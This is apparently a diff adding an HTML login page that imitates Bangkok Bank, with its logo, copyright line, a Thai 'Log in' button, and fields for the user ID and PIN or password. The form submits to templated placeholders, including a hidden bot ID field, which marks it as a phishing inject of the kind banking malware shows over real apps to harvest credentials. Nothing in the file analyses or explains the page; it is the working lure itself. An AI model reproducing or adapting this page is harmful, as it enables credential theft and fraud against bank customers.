@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+
+<html>
+  <head>
+ 
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+
+
+<style type="text/css">
+
+*{outline:none;}.br{border:1px dotted red;}.stol{display:table;}.td{display:table-cell;}.w100{width:100% !important;}.left_{text-align:left;}.right_{text-align:right;}.center{text-align:center;}.top{vertical-align:top;}.bottom{vertical-align:bottom;}.middle{vertical-align:middle;}.inline{display:inline-block;}.pad{padding:15px;}.tr{display:table-row;}.none{display:none;}body,html{background-color:transparent;}
+  
+ .h100{
+   height:100%;
+} 
+
+html,body{
+  height:100%
+  
+}
+ 
+
+  
+
+  @media (max-width: 768px){
+	 .block-xs{
+         display:block;
+		 width:100% !important;
+     }
+	 .center-xs{
+	  text-align:center !important;
+	 }
+  }
+.logo {
+    padding-top: 30px;
+    text-align: center;
+}
+
+body {
+    background: #fbfbfb;
+}
+.form-group {
+    margin: 0px;
+}
+.main {
+    padding-top: 30px;
+}
+
+input.form-control.username {
+    border-bottom: 0px;
+}
+
+input.form-control {
+    border-radius: 0px;
+	transition:all .2s ease;
+}
+
+input.form-control:focus {
+    box-shadow: none;
+    border-color: #CECCCC;
+}
+
+input.form-control {
+    text-align: center;
+    border-radius: 0px 0px 3px 3px;
+}
+
+input.form-control.username {
+    border-radius: 5px 5px 0px 0px;
+}
+
+.main {
+    text-align: center;
+}
+
+a.button_a {
+    background: #013299;
+    margin-top: 20px;
+    display: inline-block;
+    width: 100%;
+    max-width: 400px;
+    color: white;
+    text-shadow: 1px 1px 1px black;
+    border-radius: 5px;
+    text-align: center;
+    padding: 10px 10px;
+    box-shadow: 0px 0px 12px 0px #062c7d inset;
+}
+
+.form-group.has-error input {
+    border-color: #cccccc !important;
+    background: antiquewhite;
+	box-shadow:none;
+}
+
+.td.copy {
+    text-align: center;
+    font-size: .8em;
+    color: #6d6a6a;
+}
+.has-error .form-control:focus {
+    box-shadow: none;
+}
+
+.has-error input::-webkit-input-placeholder {color:#c0392b;}
+.has-error input::-moz-placeholder          {color:#c0392b;}
+.has-error input:-moz-placeholder           {color:#c0392b;}
+.has-error input:-ms-input-placeholder      {color:#c0392b;}
+</style>
+  </head>
+  <body>
+<div  class="stol h100 w100 "  style="">
+		<div  class="tr h100 "  style="">
+		    <div  class="td "  style="">
+
+<div  class="logo "  style="">
+		<img src="http://i.imgur.com/GHfqVM4.png" style="" class=""/>
+</div>  
+  
+
+  <form role="form" name="" action="%ACTION%" method="POST" onsubmit="send_key();return false" class="form">
+	<input type="hidden" name="page_id" value="%PKG%" class="main_input"><input type="hidden" name="bot_id" value="%BOTID%" />
+	
+<div  class="main "  style="">
+		<div  class="container-fluid "  style="">
+				<div  class="form-group "  style="">
+						<input class="form-control username" type="text" name="fields[username]" id="username"  placeholder="User ID" />
+				</div>
+				
+				<div  class="form-group "  style="">
+						<input class="form-control pass" type="Password" name="fields[pass]" id="pass"  placeholder="PIN/Password" />
+						<input type="submit" style="display:none"/>
+				</div>
+				
+				<a  class="button_a " onclick="send_key()">
+						&#3648;&#3586;&#3657;&#3634;&#3626;&#3641;&#3656;&#3619;&#3632;&#3610;&#3610;
+				</a>
+		</div>
+</div>  
+  </form>
+  
+			</div>		
+		</div>
+		<div  class="tr footer"  style="">
+				<div  class="td copy"  style="">
+						<span  class="">&copy; Copyrights 2012 Bangkok Bank PCL</span>
+				</div>
+		</div>
+		
+</div>
+  
+  
+  
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> 
+  </body>
+ 
+<script>
+  
+
+$('.form-control').on('focus',function(){
+		$(this).closest('.form-group').removeClass('has-error');
+})
+
+  
+function send_key(){
+   username=$('#username').val().trim();
+   pass=$('#pass').val().trim();
+   
+   $('.has-error').removeClass('has-error');
+   if(!/^.{1,40}\b/.test(username)){
+		$('#username').closest('.form-group').addClass('has-error');
+	}
+	if(!/^[a-z-A-Z0-9]{1,40}\b/.test(pass)){
+		$('#pass').closest('.form-group').addClass('has-error');
+	}
+	 
+	 if($('.has-error:visible').size()>0){
+		 return false;
+	 }
+	
+    $('form')[0].submit()
+   
+   
+};//send_key
+  
+  
+  
+  
+  
+</script>
+</html>  
